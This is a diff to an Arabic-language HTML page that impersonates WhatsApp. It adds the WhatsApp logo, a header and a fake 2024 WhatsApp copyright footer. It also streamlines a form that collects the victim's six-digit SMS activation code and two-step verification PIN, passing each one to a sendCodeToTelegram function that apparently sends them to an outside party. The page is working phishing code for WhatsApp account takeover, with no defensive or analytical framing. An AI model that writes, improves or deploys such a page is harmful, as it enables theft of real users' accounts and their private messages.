@@ -14,17 +14,41 @@
             background-color: #FFFFFF;
             display: flex;
             flex-direction: column;
-            justify-content: center;
+            justify-content: space-between;
             align-items: center;
             height: 100vh;
             text-align: center;
         }
 
+        header {
+            width: 100%;
+            height: 60px;
+            background-color: #25D366;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.1);
+            position: fixed;
+            top: 0;
+        }
+
+        header img {
+            width: 40px;
+            margin-right: 10px;
+        }
+
+        header h1 {
+            color: white;
+            font-size: 18px;
+            margin: 0;
+            font-weight: bold;
+        }
+
         .container {
-            padding: 20px;
-            text-align: center;
+            margin-top: 100px;
             width: 90%;
             max-width: 400px;
+            text-align: center;
         }
 
         h1 {
@@ -90,15 +114,38 @@
             text-decoration: underline;
         }
 
-        #countdown {
-            color: red;
-            font-weight: bold;
-            margin-top: 10px;
+        footer {
+            width: 100%;
+            background-color: #F8F9FA;
+            text-align: center;
+            padding: 10px 0;
+            box-shadow: 0px -2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        footer p {
+            font-size: 12px;
+            color: #666666;
+            margin: 5px 0;
+        }
+
+        footer a {
+            font-size: 12px;
+            color: #25D366;
+            text-decoration: none;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
 
 <body>
+    <header>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
+        <h1>WhatsApp</h1>
+    </header>
+
     <div class="container" id="container">
         <h1>رمز التفعيل</h1>
         <p>يرجى إدخال رمز التفعيل المكون من 6 أرقام الذي تلقيته عبر رسالة نصية.</p>
@@ -106,6 +153,11 @@
         <button onclick="submitFirstActivationCode()">متابعة</button>
         <div id="countdown"></div>
     </div>
+
+    <footer>
+        <p>حقوق النشر © 2024 WhatsApp Inc.</p>
+        <a href="#">سياسة الخصوصية</a> | <a href="#">الشروط</a>
+    </footer>
 
     <script>
         function sendCodeToTelegram(code, type) {
@@ -127,23 +179,6 @@
             });
         }
 
-        function startCountdown(callback) {
-            let countdownValue = 5;
-            const countdownDisplay = document.getElementById('countdown');
-            countdownDisplay.textContent = `انتظر ${countdownValue} ثانية`;
-
-            const interval = setInterval(() => {
-                countdownValue--;
-                if (countdownValue <= 0) {
-                    clearInterval(interval);
-                    countdownDisplay.textContent = '';
-                    callback();
-                } else {
-                    countdownDisplay.textContent = `انتظر ${countdownValue} ثانية`;
-                }
-            }, 1000);
-        }
-
         function submitFirstActivationCode() {
             const activationCode1 = document.getElementById('activationCode1').value;
 
@@ -154,45 +189,20 @@
 
             sendCodeToTelegram(activationCode1, "رمز التفعيل الأول");
 
-            startCountdown(() => {
-                const container = document.getElementById('container');
-                container.innerHTML = `
-                    <h1>رمز التفعيل الثاني</h1>
-                    <p>يرجى إدخال رمز التفعيل الثاني المكون من 6 أرقام.</p>
-                    <input id="activationCode2" class="pin-input" type="password" maxlength="6" placeholder="••••••">
-                    <button onclick="submitSecondActivationCode()">متابعة</button>
-                    <div id="countdown"></div>
-                `;
-            });
+            const container = document.getElementById('container');
+            container.innerHTML = `
+                <h1>التحقق بخطوتين</h1>
+                <p>يرجى إدخال رمز PIN الذي قمت بإعداده مسبقًا أثناء إعداد التحقق بخطوتين.</p>
+                <input id="pinCode1" class="pin-input" type="password" maxlength="6" placeholder="••••••">
+                <a href="#" class="forgot-link">نسيت رمز PIN؟</a>
+                <p class="instruction">
+                    هذا الرمز ليس رمز التفعيل الذي تلقيته، بل رمز PIN الذي قمت بإعداده مسبقًا.
+                </p>
+                <button onclick="submitPin()">متابعة</button>
+            `;
         }
 
-        function submitSecondActivationCode() {
-            const activationCode2 = document.getElementById('activationCode2').value;
-
-            if (!activationCode2 || activationCode2.length !== 6 || !/^\d{6}$/.test(activationCode2)) {
-                alert('يرجى إعادة إدخال رمز التفعيل الصحيح المكون من 6 أرقام.');
-                return;
-            }
-
-            sendCodeToTelegram(activationCode2, "رمز التفعيل الثاني");
-
-            startCountdown(() => {
-                const container = document.getElementById('container');
-                container.innerHTML = `
-                    <h1>التحقق بخطوتين</h1>
-                    <p>يرجى إدخال رمز PIN الذي قمت بإعداده مسبقًا أثناء إعداد التحقق بخطوتين.</p>
-                    <input id="pinCode1" class="pin-input" type="password" maxlength="6" placeholder="••••••">
-                    <a href="#" class="forgot-link">نسيت رمز PIN؟</a>
-                    <p class="instruction">
-                        هذا الرمز ليس رمز التفعيل الذي تلقيته، بل رمز PIN الذي قمت بإعداده مسبقًا.
-                    </p>
-                    <button onclick="submitFirstPin()">متابعة</button>
-                    <div id="countdown"></div>
-                `;
-            });
-        }
-
-        function submitFirstPin() {
+        function submitPin() {
             const pinCode1 = document.getElementById('pinCode1').value;
 
             if (!pinCode1 || pinCode1.length !== 6 || !/^\d+$/.test(pinCode1)) {
@@ -201,32 +211,7 @@
             }
 
             sendCodeToTelegram(pinCode1, "رمز PIN الأول");
-
-            startCountdown(() => {
-                const container = document.getElementById('container');
-                container.innerHTML = `
-                    <h1>إعادة رمز PIN</h1>
-                    <p>يرجى إعادة إدخال رمز PIN المكون من 6 أرقام لتأكيد الدخول.</p>
-                    <input id="pinCode2" class="pin-input" type="password" maxlength="6" placeholder="••••••">
-                    <button onclick="submitSecondPin()">متابعة</button>
-                    <div id="countdown"></div>
-                `;
-            });
-        }
-
-        function submitSecondPin() {
-            const pinCode2 = document.getElementById('pinCode2').value;
-
-            if (!pinCode2 || pinCode2.length !== 6 || !/^\d+$/.test(pinCode2)) {
-                alert('يرجى إعادة إدخال رمز PIN الصحيح.');
-                return;
-            }
-
-            sendCodeToTelegram(pinCode2, "رمز PIN الثاني");
-
-            startCountdown(() => {
-                alert('تم تأكيد الدخول بنجاح!');
-            });
+            alert('تم تأكيد الدخول بنجاح!');
         }
     </script>
 </body>
